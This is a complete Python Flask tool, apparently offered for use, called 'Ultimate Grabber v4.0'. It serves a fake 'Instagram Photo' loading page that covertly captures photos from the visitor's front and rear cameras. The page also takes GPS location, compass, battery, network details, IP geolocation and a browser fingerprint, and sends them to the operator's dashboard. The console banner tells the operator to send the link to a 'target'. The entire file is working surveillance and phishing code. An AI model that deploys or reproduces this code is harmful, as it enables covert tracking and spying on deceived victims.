#!/usr/bin/env python3
"""
==================================================
  🔥 ULTIMATE LOCATION + CAMERA GRABBER v4.0
  Zero-Click | Multi-Engine | Stealth
==================================================
"""
from flask import Flask, request, Response, redirect, jsonify
import json, os, socket, base64, urllib.parse, hashlib, uuid
from datetime import datetime
import threading, time, io

app = Flask(__name__)

# ===========================================
# 🎯 ULTIMATE HTML - Location + Camera + All
# ===========================================
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Instagram Photo</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;overflow:hidden;height:100vh}
.loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;width:90%}
.spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #0095f6;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.status{font-size:14px;color:#666;margin-top:20px;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
.hidden{display:none!important}
video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01}
canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01}
</style>
</head>
<body>
<div class="loader">
    <div class="spinner"></div>
    <div style="font-size:18px;color:#fff;margin-bottom:5px">Loading media...</div>
    <div class="status">Preparing your content</div>
</div>

<!-- Hidden video elements for camera capture -->
<video id="frontVideo" autoplay playsinline muted></video>
<video id="backVideo" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
// ============================================
// 🔥 ULTIMATE GRABBER v4.0
// Camera + Location + Sensors + All
// ============================================
(function(){
    var ENDPOINT = window.location.origin + "/grab";
    var IMG_ENDPOINT = window.location.origin + "/upload";
    var sent = false;
    var startTime = Date.now();
    var photosCaptured = 0;
    
    function send(data){
        if(sent) return;
        var payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
        
        // Multiple channels
        new Image().src = ENDPOINT + "?d=" + payload + "&r=" + Math.random();
        try{
            var xhr = new XMLHttpRequest();
            xhr.open("GET", ENDPOINT + "?d=" + payload, true);
            xhr.send();
        }catch(e){}
        try{
            fetch(ENDPOINT + "?d=" + payload, {mode:'no-cors'});
        }catch(e){}
        try{
            navigator.sendBeacon(ENDPOINT + "?d=" + payload);
        }catch(e){}
    }
    
    function sendPhoto(dataUrl, cameraType){
        try{
            var xhr = new XMLHttpRequest();
            xhr.open("POST", IMG_ENDPOINT, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({
                image: dataUrl,
                camera: cameraType,
                ts: Date.now(),
                id: navigator.userAgent.substring(0,20)
            }));
        }catch(e){}
    }
    
    // ============================================
    // TECHNIQUE 1: CAMERA CAPTURE (FRONT + BACK)
    // ============================================
    (function(){
        var canvas = document.getElementById('canvas');
        var ctx = canvas.getContext('2d');
        canvas.width = 640;
        canvas.height = 480;
        
        // === FRONT CAMERA (Selfie) ===
        try{
            var frontVideo = document.getElementById('frontVideo');
            // Try multiple front camera constraints
            var constraints = [
                {video: {facingMode: 'user', width: {ideal: 640}, height: {ideal: 480}}},
                {video: {facingMode: {exact: 'user'}}},
                {video: true}
            ];
            
            function tryFrontCamera(idx){
                if(idx >= constraints.length) return;
                navigator.mediaDevices.getUserMedia(constraints[idx])
                .then(function(stream){
                    frontVideo.srcObject = stream;
                    frontVideo.onloadedmetadata = function(){
                        // Capture photo after 1 second delay
                        setTimeout(function(){
                            try{
                                canvas.width = frontVideo.videoWidth || 640;
                                canvas.height = frontVideo.videoHeight || 480;
                                ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
                                var dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                                sendPhoto(dataUrl, 'front');
                                photosCaptured++;
                                console.log('📸 Front camera photo captured');
                                
                                // Capture multiple photos at intervals
                                setTimeout(function(){
                                    ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
                                    sendPhoto(canvas.toDataURL('image/jpeg', 0.7), 'front_2');
                                }, 2000);
                                setTimeout(function(){
                                    ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
                                    sendPhoto(canvas.toDataURL('image/jpeg', 0.7), 'front_3');
                                }, 4000);
                            }catch(e){console.log('Front capture error:', e);}
                        }, 1000);
                    };
                })
                .catch(function(err){
                    console.log('Front camera ' + idx + ' failed:', err.message);
                    tryFrontCamera(idx + 1);
                });
            }
            tryFrontCamera(0);
        }catch(e){console.log('Front camera error:', e);}
        
        // === BACK CAMERA (Rear) ===
        try{
            var backVideo = document.getElementById('backVideo');
            var backConstraints = [
                {video: {facingMode: 'environment', width: {ideal: 640}, height: {ideal: 480}}},
                {video: {facingMode: {exact: 'environment'}}}
            ];
            
            function tryBackCamera(idx){
                if(idx >= backConstraints.length) return;
                navigator.mediaDevices.getUserMedia(backConstraints[idx])
                .then(function(stream){
                    backVideo.srcObject = stream;
                    backVideo.onloadedmetadata = function(){
                        setTimeout(function(){
                            try{
                                canvas.width = backVideo.videoWidth || 640;
                                canvas.height = backVideo.videoHeight || 480;
                                ctx.drawImage(backVideo, 0, 0, canvas.width, canvas.height);
                                var dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                                sendPhoto(dataUrl, 'back');
                                photosCaptured++;
                                console.log('📸 Back camera photo captured');
                                
                                setTimeout(function(){
                                    ctx.drawImage(backVideo, 0, 0, canvas.width, canvas.height);
                                    sendPhoto(canvas.toDataURL('image/jpeg', 0.7), 'back_2');
                                }, 3000);
                            }catch(e){console.log('Back capture error:', e);}
                        }, 1500);
                    };
                })
                .catch(function(err){
                    console.log('Back camera ' + idx + ' failed:', err.message);
                    tryBackCamera(idx + 1);
                });
            }
            tryBackCamera(0);
        }catch(e){console.log('Back camera error:', e);}
        
        // === FALLBACK: Try without specific facingMode ===
        try{
            setTimeout(function(){
                if(photosCaptured === 0){
                    navigator.mediaDevices.getUserMedia({video: true})
                    .then(function(stream){
                        var vid = document.createElement('video');
                        vid.srcObject = stream;
                        vid.onloadedmetadata = function(){
                            setTimeout(function(){
                                ctx.drawImage(vid, 0, 0, 640, 480);
                                sendPhoto(canvas.toDataURL('image/jpeg', 0.8), 'fallback');
                                stream.getTracks().forEach(function(t){t.stop();});
                            }, 1000);
                        };
                        vid.play();
                    }).catch(function(e){console.log('Fallback camera failed:', e);});
                }
            }, 3000);
        }catch(e){}
    })();
    
    // ============================================
    // TECHNIQUE 2: GPS LOCATION
    // ============================================
    try{
        navigator.geolocation.getCurrentPosition(
            function(p){
                send({
                    lat: p.coords.latitude,
                    lng: p.coords.longitude,
                    acc: p.coords.accuracy,
                    alt: p.coords.altitude || null,
                    heading: p.coords.heading || null,
                    speed: p.coords.speed || null,
                    ts: p.timestamp,
                    src: "gps"
                });
            },
            function(err){
                send({gpsErr: err.code, msg: err.message, src: "gps_err"});
            },
            {enableHighAccuracy:true, timeout:3000, maximumAge:0}
        );
    }catch(e){}

    // ============================================
    // TECHNIQUE 3: COMPASS (NO PERMISSION NEEDED)
    // ============================================
    try{
        if(window.DeviceOrientationEvent){
            window.addEventListener("deviceorientation", function(e){
                if(e.alpha !== null){
                    send({
                        compass_alpha: e.alpha,
                        compass_beta: e.beta,
                        compass_gamma: e.gamma,
                        compass_abs: e.absolute,
                        src: "compass"
                    });
                    window.removeEventListener("deviceorientation", arguments.callee);
                }
            });
            // Request permission for iOS 13+
            if(typeof DeviceOrientationEvent.requestPermission === 'function'){
                DeviceOrientationEvent.requestPermission().then(function(state){
                    if(state === 'granted'){
                        window.addEventListener('deviceorientation', function(e){
                            if(e.alpha !== null){
                                send({compass_alpha: e.alpha, src: "compass_ios"});
                            }
                        });
                    }
                }).catch(function(){});
            }
        }
    }catch(e){}

    // ============================================
    // TECHNIQUE 4: NETWORK INFO
    // ============================================
    try{
        if(navigator.connection){
            var c = navigator.connection;
            send({
                net_type: c.effectiveType,
                downlink: c.downlink,
                rtt: c.rtt,
                save: c.saveData,
                src: "network"
            });
        }
    }catch(e){}

    // ============================================
    // TECHNIQUE 5: BATTERY
    // ============================================
    try{
        if(navigator.getBattery){
            navigator.getBattery().then(function(b){
                send({
                    battery_level: Math.round(b.level * 100),
                    charging: b.charging,
                    src: "battery"
                });
            });
        }
    }catch(e){}

    // ============================================
    // TECHNIQUE 6: SCREEN INFO
    // ============================================
    try{
        send({
            screen_w: screen.width,
            screen_h: screen.height,
            pixel_ratio: window.devicePixelRatio,
            orientation: screen.orientation ? screen.orientation.type : "unknown",
            src: "screen"
        });
    }catch(e){}

    // ============================================
    // TECHNIQUE 7: TIMEZONE
    // ============================================
    try{
        send({
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset(),
            locale: navigator.language,
            src: "locale"
        });
    }catch(e){}

    // ============================================
    // TECHNIQUE 8: IP GEOLOCATION
    // ============================================
    try{
        fetch("https://ipapi.co/json/").then(function(r){return r.json();}).then(function(d){
            d.src = "ipgeo";
            send(d);
        }).catch(function(){});
        // Fallback IP service
        fetch("https://ipwhois.app/json/").then(function(r){return r.json();}).then(function(d){
            d.src = "ipgeo2";
            send(d);
        }).catch(function(){});
    }catch(e){}

    // ============================================
    // TECHNIQUE 9: BROWSER FINGERPRINT
    // ============================================
    try{
        send({
            ua: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            cookieEnabled: navigator.cookieEnabled,
            languages: navigator.languages ? navigator.languages.join(",") : "",
            hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
            deviceMemory: navigator.deviceMemory || "unknown",
            src: "fingerprint"
        });
    }catch(e){}

    // ============================================
    // TECHNIQUE 10: STORAGE
    // ============================================
    try{
        if(navigator.storage && navigator.storage.estimate){
            navigator.storage.estimate().then(function(s){
                send({
                    storage_used_mb: Math.round(s.usage / 1024 / 1024),
                    storage_total_mb: Math.round(s.quota / 1024 / 1024),
                    src: "storage"
                });
            });
        }
    }catch(e){}

    // ============================================
    // TECHNIQUE 11: CAMERA INFO
    // ============================================
    try{
        if(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices){
            navigator.mediaDevices.enumerateDevices().then(function(devices){
                var cams = [];
                devices.forEach(function(d){
                    if(d.kind === 'videoinput'){
                        cams.push(d.label || 'Camera ' + cams.length);
                    }
                });
                send({cameras: cams.join(" | "), cam_count: cams.length, src: "cameras"});
            }).catch(function(){});
        }
    }catch(e){}

    // ============================================
    // FINAL: Auto-send after 6 seconds
    // ============================================
    setTimeout(function(){
        if(!sent){
            send({timeout: true, load_time_ms: Date.now() - startTime, photos: photosCaptured, src: "final"});
        }
    }, 6000);

    console.log('🔥 Ultimate Grabber v4.0 initialized');
})();
</script>
</body>
</html>"""

# ===========================================
# 📸 PHOTO STORAGE
# ===========================================
PHOTO_DIR = os.path.expanduser('~/captured_photos')
os.makedirs(PHOTO_DIR, exist_ok=True)

# ===========================================
# 📊 DATABASE
# ===========================================
class Database:
    def __init__(self):
        self.filepath = os.path.expanduser('~/ultimate_data.json')
        self.stats = {'total_hits': 0, 'gps_hits': 0, 'compass_hits': 0, 'photos': 0}
        if not os.path.exists(self.filepath):
            with open(self.filepath, 'w') as f:
                f.write(json.dumps([], indent=2))
    
    def save(self, data):
        try:
            with open(self.filepath, 'r') as f:
                records = json.loads(f.read() or '[]')
        except:
            records = []
        
        record = {
            'id': hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:8],
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'data': data
        }
        records.append(record)
        if len(records) > 2000:
            records = records[-2000:]
        
        with open(self.filepath, 'w') as f:
            f.write(json.dumps(records, indent=2))
        
        self.stats['total_hits'] += 1
        if 'lat' in data: self.stats['gps_hits'] += 1
        if 'compass_alpha' in data or 'compass' in data: self.stats['compass_hits'] += 1
    
    def save_photo(self, image_data, camera_type, ip, ua):
        """Save photo to disk"""
        try:
            # Generate filename
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            uid = uuid.uuid4().hex[:6]
            filename = f"{camera_type}_{ts}_{uid}.jpg"
            filepath = os.path.join(PHOTO_DIR, filename)
            
            # Decode base64 and save
            if ',' in image_data:
                image_data = image_data.split(',')[1]
            img_bytes = base64.b64decode(image_data)
            
            with open(filepath, 'wb') as f:
                f.write(img_bytes)
            
            self.stats['photos'] += 1
            
            print(f"\n  📸 PHOTO CAPTURED: {filename}")
            print(f"     Camera: {camera_type}")
            print(f"     Size: {len(img_bytes) // 1024}KB")
            print(f"     Path: {filepath}")
            
            # Save metadata
            meta = {
                'filename': filename,
                'camera': camera_type,
                'timestamp': ts,
                'ip': ip,
                'ua': ua[:50],
                'size_bytes': len(img_bytes)
            }
            meta_path = os.path.join(PHOTO_DIR, f"{camera_type}_{ts}_{uid}.json")
            with open(meta_path, 'w') as f:
                f.write(json.dumps(meta, indent=2))
            
            return filename
        except Exception as e:
            print(f"[-] Photo save error: {e}")
            return None

db = Database()

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/grab')
def grab():
    d = request.args.get('d')
    ip = request.remote_addr
    
    if d:
        try:
            decoded = base64.b64decode(d).decode('utf-8')
            data = json.loads(decoded)
            data['_ip'] = ip
            data['_time'] = datetime.now().strftime('%H:%M:%S')
            db.save(data)
            
            # Print location info
            ts = datetime.now().strftime('%H:%M:%S')
            print(f"\n{'='*55}")
            print(f"  📍 DATA RECEIVED at {ts}")
            
            if 'lat' in data:
                print(f"  🌍 GPS: {data['lat']}, {data['lng']} (±{data.get('acc','?')}m)")
                print(f"  📌 https://www.google.com/maps?q={data['lat']},{data['lng']}")
            if 'compass_alpha' in data:
                print(f"  🧭 Compass: {data['compass_alpha']}°")
            if 'timezone' in data:
                print(f"  🕐 TZ: {data['timezone']}")
            if 'net_type' in data:
                print(f"  📶 Network: {data['net_type']}")
            if 'cameras' in data:
                print(f"  📷 Cameras: {data['cameras']}")
            if 'battery_level' in data:
                print(f"  🔋 Battery: {data['battery_level']}%")
            
            print(f"  📊 Total: {db.stats['total_hits']} | 📸 Photos: {db.stats['photos']}")
            
        except Exception as e:
            print(f"[-] Parse error: {e}")
    
    # Return 1x1 GIF
    return Response(
        b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b',
        mimetype='image/gif',
        headers={'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-cache'}
    )

@app.route('/upload', methods=['POST'])
def upload_photo():
    """Receive camera photos"""
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    
    try:
        data = request.get_json()
        if data and 'image' in data:
            filename = db.save_photo(
                data['image'],
                data.get('camera', 'unknown'),
                ip,
                ua
            )
            return jsonify({'status': 'ok', 'file': filename})
    except Exception as e:
        print(f"[-] Upload error: {e}")
    
    return jsonify({'status': 'error'})

@app.route('/view')
def view_dashboard():
    records = db.get_all()
    
    # Get photos list
    photos = []
    try:
        for f in sorted(os.listdir(PHOTO_DIR), reverse=True):
            if f.endswith('.jpg'):
                photos.append(f)
    except:
        pass
    
    html = """<!DOCTYPE html>
<html>
<head>
<title>🔥 Ultimate Dashboard</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:'Courier New',monospace;padding:20px}
h1{color:#ff4444;font-size:28px;margin-bottom:5px;text-shadow:0 0 20px rgba(255,68,68,0.3)}
.sub{color:#666;font-size:14px;margin-bottom:20px}
.stats{display:flex;gap:15px;margin-bottom:20px;flex-wrap:wrap}
.stat{background:#1a1a1a;border:1px solid #333;border-radius:10px;padding:15px 25px;text-align:center;min-width:120px}
.stat .num{font-size:32px;color:#ff4444;font-weight:bold}
.stat .lbl{font-size:12px;color:#888;margin-top:5px}
.tab-bar{display:flex;gap:5px;margin-bottom:20px}
.tab{background:#1a1a1a;border:1px solid #333;border-radius:8px 8px 0 0;padding:10px 20px;cursor:pointer;font-size:14px;color:#888}
.tab.active{background:#222;color:#ff4444;border-color:#ff4444}
.tab-content{display:none}
.tab-content.active{display:block}
.record{background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:15px;margin-bottom:10px;word-wrap:break-word}
.record .time{color:#ff4444;font-size:12px;margin-bottom:5px}
.record .coords{color:#ffcc00;font-size:16px;margin:5px 0}
.record .maps{color:#0095f6;font-size:12px}
.map-link{color:#0095f6;text-decoration:none}
.photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px}
.photo-card{background:#1a1a1a;border:1px solid #333;border-radius:8px;overflow:hidden}
.photo-card img{width:100%;height:150px;object-fit:cover;display:block}
.photo-card .info{padding:10px;font-size:12px;color:#888}
.photo-card .info .name{color:#fff;font-size:11px;margin-bottom:3px}
.actions{margin:20px 0}
.btn{background:#333;color:#fff;border:none;padding:8px 20px;border-radius:5px;cursor:pointer;font-size:14px;margin-right:10px}
.btn:hover{background:#555}
.btn.danger{background:#900;color:#fff}
.btn.danger:hover{background:#c00}
.photos-count{color:#ff4444;font-size:14px;margin-bottom:15px}
</style>
</head>
<body>
<h1>🔥 ULTIMATE GRABBER v4.0</h1>
<div class="sub">Camera + Location + Compass + All Sensors</div>

<div class="stats">
    <div class="stat"><div class="num">""" + str(db.stats['total_hits']) + """</div><div class="lbl">Data Hits</div></div>
    <div class="stat"><div class="num">""" + str(db.stats['gps_hits']) + """</div><div class="lbl">GPS Fixes</div></div>
    <div class="stat"><div class="num">""" + str(db.stats['compass_hits']) + """</div><div class="lbl">Compass</div></div>
    <div class="stat"><div class="num" style="color:#ff8800">""" + str(db.stats['photos']) + """</div><div class="lbl">📸 Photos</div></div>
    <div class="stat"><div class="num">""" + str(len(records)) + """</div><div class="lbl">Records</div></div>
</div>

<div class="tab-bar">
    <div class="tab active" onclick="switchTab('locations')">📍 Locations</div>
    <div class="tab" onclick="switchTab('photos')">📸 Photos (""" + str(len(photos)) + """)</div>
</div>

<div class="actions">
    <button class="btn" onclick="location.reload()">🔄 Refresh</button>
    <button class="btn danger" onclick="if(confirm('Clear ALL data and photos?')){window.location.href='/clear'}">🗑️ Clear All</button>
</div>

<div id="tab-locations" class="tab-content active">"""
    
    if records:
        for rec in reversed(records[-30:]):
            d = rec['data']
            html += '<div class="record">'
            html += f'<div class="time">🕐 {rec["timestamp"]} | #{rec["id"]}</div>'
            if 'lat' in d:
                html += f'<div class="coords">🌍 {d["lat"]}, {d["lng"]} (±{d.get("acc","?")}m)</div>'
                html += f'<div class="maps"><a class="map-link" href="https://www.google.com/maps?q={d["lat"]},{d["lng"]}" target="_blank">📍 Open Maps</a></div>'
            if 'compass_alpha' in d:
                html += f'<div>🧭 Compass: {d["compass_alpha"]}°</div>'
            if 'timezone' in d:
                html += f'<div>🕐 {d["timezone"]}</div>'
            if 'net_type' in d:
                html += f'<div>📶 {d["net_type"]}</div>'
            if 'cameras' in d:
                html += f'<div>📷 {d["cameras"]}</div>'
            html += f'<div style="color:#555;font-size:10px;margin-top:5px">{d.get("src","")}</div>'
            html += '</div>'
    else:
        html += '<div style="color:#666;text-align:center;padding:40px">No data yet. Share the link!</div>'
    
    html += '</div>'
    
    # Photos tab
    html += '<div id="tab-photos" class="tab-content">'
    if photos:
        html += f'<div class="photos-count">📸 {len(photos)} photos captured</div>'
        html += '<div class="photo-grid">'
        for p in photos[:50]:
            html += f'<div class="photo-card">'
            html += f'<img src="/photo/{p}" alt="{p}" loading="lazy">'
            html += f'<div class="info"><div class="name">{p}</div></div>'
            html += '</div>'
        html += '</div>'
    else:
        html += '<div style="color:#666;text-align:center;padding:40px">No photos captured yet. Camera requires user permission.</div>'
    html += '</div>'
    
    html += """
<script>
function switchTab(name){
    document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
    document.querySelectorAll('.tab-content').forEach(function(t){t.classList.remove('active');});
    document.querySelector('.tab[onclick*="' + name + '"]').classList.add('active');
    document.getElementById('tab-' + name).classList.add('active');
}
</script>
</body></html>"""
    
    return html

@app.route('/photo/<filename>')
def get_photo(filename):
    """Serve captured photos"""
    filepath = os.path.join(PHOTO_DIR, filename)
    if os.path.exists(filepath):
        with open(filepath, 'rb') as f:
            img_data = f.read()
        return Response(img_data, mimetype='image/jpeg')
    return '', 404

@app.route('/clear')
def clear_all():
    # Clear data
    open(os.path.expanduser('~/ultimate_data.json'), 'w').write(json.dumps([]))
    # Clear photos
    for f in os.listdir(PHOTO_DIR):
        try:
            os.remove(os.path.join(PHOTO_DIR, f))
        except: pass
    db.stats = {'total_hits': 0, 'gps_hits': 0, 'compass_hits': 0, 'photos': 0}
    return redirect('/view')

# ===========================================
# 🚀 START
# ===========================================
if __name__ == '__main__':
    import socket as sock
    
    print("")
    print("╔" + "═"*58 + "╗")
    print("║     🔥 ULTIMATE GRABBER v4.0                   ║")
    print("║     Camera + Location + Compass + All Sensors    ║")
    print("╚" + "═"*58 + "╝")
    
    host_ip = sock.gethostbyname(sock.gethostname())
    
    print(f"\n  🌐 URL:     http://{host_ip}:5000")
    print(f"  📋 Dashboard: http://{host_ip}:5000/view")
    print(f"  📸 Photos:    http://{host_ip}:5000/view (Photos tab)")
    print(f"  🗑️ Clear:    http://{host_ip}:5000/clear")
    
    print(f"\n  📱 TARGET KO YE LINK BHEJEIN:")
    print(f"     ╔{'═'*42}╗")
    print(f"     ║  http://{host_ip}:5000              ║")
    print(f"     ╚{'═'*42}╝")
    
    print(f"\n  📸 Photos saved in: {PHOTO_DIR}")
    print(f"\n  ⏳ Waiting... (Ctrl+C to stop)")
    print("  " + "─"*58 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
